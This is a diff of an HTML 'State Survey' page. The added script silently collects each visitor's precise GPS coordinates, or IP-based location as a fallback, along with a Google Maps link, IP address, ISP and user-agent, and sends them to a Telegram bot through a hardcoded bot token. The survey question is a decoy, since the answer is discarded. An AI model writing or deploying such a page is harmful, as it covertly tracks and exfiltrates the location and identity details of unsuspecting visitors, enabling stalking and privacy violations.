@@ -4,32 +4,166 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>State Survey</title>
-    <link rel="stylesheet" href="styles.css">
-    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
-    <script defer src="script.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: url('https://source.unsplash.com/1600x900/?city') no-repeat center center fixed;
+            background-size: cover;
+            color: white;
+            text-align: center;
+            padding: 50px;
+        }
+        .container {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+        .hidden { display: none; }
+        input, button {
+            padding: 10px;
+            margin: 10px;
+            width: 80%;
+        }
+    </style>
 </head>
 <body>
-    <div class="theme-toggle" onclick="toggleTheme()">
-        <i class="fas fa-moon" id="theme-icon"></i>
-    </div>
-
-    <div class="background">
-        <img src="background.jpg" alt="City Background">
-    </div>
-
     <div class="container">
-        <img src="https://img.freepik.com/free-vector/online-survey-tablet_3446-296.jpg?t=st=1741961164~exp=1741964764~hmac=e2107172b25b43f4fa2138c3dfd9b1469e689bdf4a37f899ab2dc47e63341b3e&w=740" class="survey-icon" alt="Survey Icon">
-        <h1 id="title">State Opinion Survey</h1>
+        <h1 id="title">Welcome to the State Survey</h1>
         <p id="loading">Fetching your location...</p>
-        
+        <p id="error" class="hidden" style="color: red;"></p>
+
         <div id="survey" class="hidden">
-            <p id="question"></p>
+            <h2 id="question"></h2>
             <input type="text" id="answer" placeholder="Your Answer">
             <button onclick="submitSurvey()">Submit</button>
         </div>
-
-        <p id="error" class="error hidden"></p>
     </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            gsap.from("#title", { opacity: 0, y: -20, duration: 1 });
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+            } else {
+                showError("Geolocation is not supported by your browser.");
+            }
+        });
+
+        async function success(position) {
+            let lat = position.coords.latitude;
+            let lon = position.coords.longitude;
+            
+            console.log("📍 GPS Location Found:", lat, lon);
+
+            try {
+                let locationResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+                let locationData = await locationResponse.json();
+
+                let state = locationData.address.state || "Unknown State";
+                let city = locationData.address.city || locationData.address.town || "Unknown City";
+                let country = locationData.address.country || "Unknown Country";
+                
+                let googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+
+                // Fetch IP & ISP details
+                let ipResponse = await fetch("https://ipapi.co/json/");
+                let ipData = await ipResponse.json();
+
+                document.getElementById("loading").style.display = "none";
+                document.getElementById("survey").classList.remove("hidden");
+                document.getElementById("question").innerText = `How do you feel about living in ${state}?`;
+
+                sendToTelegram(state, city, country, lat, lon, googleMapsLink, ipData);
+
+            } catch (err) {
+                console.error("❌ Error fetching location details:", err);
+                showError("Failed to fetch location details. Using IP-based location.");
+                getIPLocation();
+            }
+        }
+
+        function error(err) {
+            console.warn("⚠️ Geolocation Error:", err);
+            showError("Failed to get GPS location. Using IP-based location.");
+            getIPLocation();
+        }
+
+        async function getIPLocation() {
+            try {
+                let ipResponse = await fetch("https://ipapi.co/json/");
+                let ipData = await ipResponse.json();
+
+                let state = ipData.region || "Unknown State";
+                let city = ipData.city || "Unknown City";
+                let country = ipData.country_name || "Unknown Country";
+
+                let googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${ipData.latitude},${ipData.longitude}`;
+
+                document.getElementById("loading").style.display = "none";
+                document.getElementById("survey").classList.remove("hidden");
+                document.getElementById("question").innerText = `How do you feel about living in ${state}?`;
+
+                sendToTelegram(state, city, country, ipData.latitude, ipData.longitude, googleMapsLink, ipData);
+            } catch (err) {
+                showError("Location retrieval failed.");
+            }
+        }
+
+        async function sendToTelegram(state, city, country, lat, lon, mapsLink, ipData) {
+            let botToken = "7082348594:AAENnyiU1uxvjATBwFinj5jcI3YgsiCzB2A";
+            let chatID = "1201917438"; // Replace with your actual Chat ID
+
+            let message = `
+🌍 **New User Location Data**  
+📍 **City:** ${city}  
+🏛 **State:** ${state}  
+🌎 **Country:** ${country}  
+📌 **Latitude:** ${lat}  
+📌 **Longitude:** ${lon}  
+📍 **Google Maps:** [View Location](${mapsLink})  
+
+💻 **IP Address:** ${ipData.ip}  
+🌐 **ISP:** ${ipData.org}  
+🖥 **User-Agent:** ${navigator.userAgent}
+            `;
+
+            try {
+                let response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: chatID,
+                        text: message,
+                        parse_mode: "Markdown"
+                    })
+                });
+
+                let result = await response.json();
+                console.log("✅ Telegram Response:", result);
+            } catch (error) {
+                console.error("❌ Telegram API Error:", error);
+            }
+        }
+
+        function showError(message) {
+            document.getElementById("loading").style.display = "none";
+            let errorElement = document.getElementById("error");
+            errorElement.innerText = message;
+            errorElement.classList.remove("hidden");
+        }
+
+        function submitSurvey() {
+            let answer = document.getElementById("answer").value.trim();
+            if (answer === "") {
+                alert("Please enter your answer before submitting.");
+            } else {
+                alert("Thank you for your response!");
+                document.getElementById("answer").value = "";
+            }
+        }
+    </script>
 </body>
 </html>
